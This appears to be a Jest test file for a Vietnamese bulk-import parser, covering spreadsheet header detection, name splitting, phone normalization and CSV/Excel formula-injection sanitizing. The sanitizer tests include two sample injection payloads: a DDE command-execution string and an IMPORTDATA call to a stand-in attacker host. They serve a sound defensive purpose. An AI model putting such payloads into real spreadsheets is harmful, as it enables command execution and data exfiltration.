import * as ExcelJS from 'exceljs';
import {
  parseBulkImportFile,
  sanitizeForExcel,
  splitFullName,
  normalizePhone,
} from './bulk-import.parser';

async function buildXlsxBuffer(
  rows: (string | null)[][],
  sheetName = 'Data',
  extraSheet?: { name: string; rows: (string | null)[][] },
): Promise<Buffer> {
  const wb = new ExcelJS.Workbook();
  if (extraSheet) {
    const guideSheet = wb.addWorksheet(extraSheet.name);
    extraSheet.rows.forEach((r) => guideSheet.addRow(r));
  }
  const ws = wb.addWorksheet(sheetName);
  rows.forEach((r) => ws.addRow(r));
  return Buffer.from(await wb.xlsx.writeBuffer());
}

describe('bulk-import.parser — parseBulkImportFile', () => {
  it('parses xlsx với header tiếng Việt đầy đủ', async () => {
    const buf = await buildXlsxBuffer([
      ['Họ tên', 'Số hiệu', 'SĐT', 'Email'],
      ['Hoàng Công Tùng', '277-794', '0909225525', 'tung@pc02.local'],
      ['Trần Văn A', '277-001', '0903389799', null],
    ]);
    const result = await parseBulkImportFile(buf, 'data.xlsx');
    expect(result.rows).toHaveLength(2);
    expect(result.rows[0]).toEqual(
      expect.objectContaining({
        rowIndex: 2,
        fullName: 'Hoàng Công Tùng',
        workId: '277-794',
        phone: '0909225525',
        email: 'tung@pc02.local',
      }),
    );
    expect(result.rows[1].email).toBeUndefined();
  });

  it('parses xlsx với header English', async () => {
    const buf = await buildXlsxBuffer([
      ['fullName', 'workId', 'phone', 'email'],
      ['Trần Hùng', '278-001', '0901111111', 'hung@pc02.local'],
    ]);
    const result = await parseBulkImportFile(buf, 'data.xlsx');
    expect(result.rows[0].fullName).toBe('Trần Hùng');
    expect(result.rows[0].workId).toBe('278-001');
  });

  it('skip sheet "Hướng dẫn" pick sheet "Data" có header', async () => {
    const buf = await buildXlsxBuffer(
      [
        ['Họ tên', 'SĐT'],
        ['Hoàng Công Tùng', '0909225525'],
      ],
      'Danh sách',
      { name: 'Hướng dẫn', rows: [['Note'], ['Đây là sheet hướng dẫn']] },
    );
    const result = await parseBulkImportFile(buf, 'data.xlsx');
    expect(result.sheetName).toBe('Danh sách');
    expect(result.rows).toHaveLength(1);
  });

  it('skip cột không nhận diện được + warn', async () => {
    const buf = await buildXlsxBuffer([
      ['Họ tên', 'SĐT', 'Ghi chú random'],
      ['Test', '0900000000', 'comment'],
    ]);
    const result = await parseBulkImportFile(buf, 'data.xlsx');
    expect(result.warnings.some((w) => w.includes('Ghi chú random'))).toBe(true);
    expect(result.rows[0]).not.toHaveProperty('note');
  });

  it('throw nếu không tìm thấy sheet header phù hợp', async () => {
    const buf = await buildXlsxBuffer([
      ['Foo', 'Bar'],
      ['x', 'y'],
    ]);
    await expect(parseBulkImportFile(buf, 'data.xlsx')).rejects.toThrow(
      /không tìm thấy sheet|header phù hợp/i,
    );
  });

  it('skip rỗng row', async () => {
    const buf = await buildXlsxBuffer([
      ['Họ tên', 'SĐT'],
      ['Trần A', '0901111111'],
      [null, null],
      ['Trần B', '0902222222'],
    ]);
    const result = await parseBulkImportFile(buf, 'data.xlsx');
    expect(result.rows).toHaveLength(2);
  });
});

describe('bulk-import.parser — sanitizeForExcel (CRITICAL formula injection)', () => {
  it('prefix `\'` cho cell bắt đầu `=`', () => {
    expect(sanitizeForExcel('=cmd|\'/c calc\'!A1')).toBe("'=cmd|'/c calc'!A1");
  });
  it('prefix `\'` cho cell bắt đầu `+`', () => {
    expect(sanitizeForExcel('+IMPORTDATA("http://attacker")')).toBe(
      `'+IMPORTDATA("http://attacker")`,
    );
  });
  it('prefix `\'` cho cell bắt đầu `-`', () => {
    expect(sanitizeForExcel('-1+1')).toBe(`'-1+1`);
  });
  it('prefix `\'` cho cell bắt đầu `@`', () => {
    expect(sanitizeForExcel('@SUM(A1:A10)')).toBe(`'@SUM(A1:A10)`);
  });
  it('KHÔNG prefix nếu cell an toàn', () => {
    expect(sanitizeForExcel('Hoàng Công Tùng')).toBe('Hoàng Công Tùng');
    expect(sanitizeForExcel('277-794')).toBe('277-794'); // dash NOT prefix char
  });
  it('handle null/undefined → empty string', () => {
    expect(sanitizeForExcel(null)).toBe('');
    expect(sanitizeForExcel(undefined)).toBe('');
  });
});

describe('bulk-import.parser — splitFullName', () => {
  it('"Hoàng Công Tùng" → firstName Tùng, lastName Hoàng Công', () => {
    expect(splitFullName('Hoàng Công Tùng')).toEqual({
      firstName: 'Tùng',
      lastName: 'Hoàng Công',
    });
  });
  it('"Trần Hùng" → firstName Hùng, lastName Trần', () => {
    expect(splitFullName('Trần Hùng')).toEqual({ firstName: 'Hùng', lastName: 'Trần' });
  });
  it('1 từ → firstName only', () => {
    expect(splitFullName('Madonna')).toEqual({ firstName: 'Madonna', lastName: null });
  });
  it('null/empty → null/null', () => {
    expect(splitFullName(null)).toEqual({ firstName: null, lastName: null });
    expect(splitFullName('')).toEqual({ firstName: null, lastName: null });
  });
});

describe('bulk-import.parser — normalizePhone', () => {
  it('strip space/dash/dot', () => {
    expect(normalizePhone('0909 225 525')).toBe('0909225525');
    expect(normalizePhone('0909.225.525')).toBe('0909225525');
    expect(normalizePhone('0909-225-525')).toBe('0909225525');
  });
  it('+84 prefix OK', () => {
    expect(normalizePhone('+84909225525')).toBe('+84909225525');
  });
  it('invalid shape → null', () => {
    expect(normalizePhone('12345')).toBeNull(); // too short
    expect(normalizePhone('abc')).toBeNull();
    expect(normalizePhone(null)).toBeNull();
  });
});
